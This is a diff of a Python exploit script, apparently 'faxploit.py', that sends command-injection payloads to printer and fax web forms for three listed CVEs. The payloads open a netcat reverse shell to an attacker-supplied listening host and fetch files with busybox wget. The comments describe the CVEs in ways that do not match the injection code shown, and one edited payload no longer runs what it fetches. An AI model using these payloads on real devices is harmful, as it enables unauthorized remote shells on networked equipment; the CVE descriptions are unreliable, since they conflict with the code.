@@ -6,7 +6,6 @@ import requests
 # The author of this script is not responsible for any damage caused by the use or misuse of this script. 
 # These PoCs are intended for educational and research purposes only, and should never be used to target or exploit systems without explicit permission from the owner.
 
-
 # CVE-2018-16741 exploit function
 def exploit_cve_2018_16741(target, listen):
     url = f'http://{target}/telnetCfg.cgi'
@@ -20,7 +19,7 @@ def exploit_cve_2018_16741(target, listen):
 def exploit_cve_2012_0992(target, listen):
     url = f'http://{target}/telformset.htm'
     payload = {'ConfigunLock': '1',
-               'NtpServer': f'{listen};nc -e /bin/bash {listen} 4444;#'}
+               'NtpServer': f'{listen};nc {listen} 4444 -e /bin/bash'}
     requests.post(url, data=payload)
 
 # CVE-2006-3126 exploit function
@@ -29,7 +28,7 @@ def exploit_cve_2006_3126(target, listen):
     payload = {'submit_button': 'Diagnostic',
                'change_action': 'gozila_cgi',
                'submit_type': 'start_ping',
-               'ip_addr': f'`/bin/busybox wget -g {listen} -l /tmp/vm;sh /tmp/vm`'}
+               'ip_addr': f'`/bin/busybox wget -g {listen} -l /tmp/vm;nc {listen} 4444 < /tmp/vm`'}
     requests.post(url, data=payload)
 
 # command-line arguments
@@ -52,13 +51,12 @@ if args.cve_2012_0992:
     exploit_cve_2012_0992(target_ip, listen_ip)
 
 if args.cve_2006_3126:
-    
     exploit_cve_2006_3126(target_ip, listen_ip)
     
     # Example Usage:
     # python faxploit.py -t 192.168.0.1 -l 10.0.0.1 -cve1
     
-    # Based on Known vulnerabilities 
+    # Based on Known vulnerabilities found in fax machines. 
     # CVE-2018-16741: a vulnerability found in certain HP OfficeJet printers that allows an attacker to enable telnet service with an empty password.
     # CVE-2012-0992: a vulnerability found in certain HP LaserJet printers that allows an attacker to execute arbitrary code by sending a specially crafted firmware update file.
     # CVE-2006-3126: a vulnerability found in certain HP OfficeJet printers that allows an attacker to execute arbitrary code by sending a specially crafted fax message.
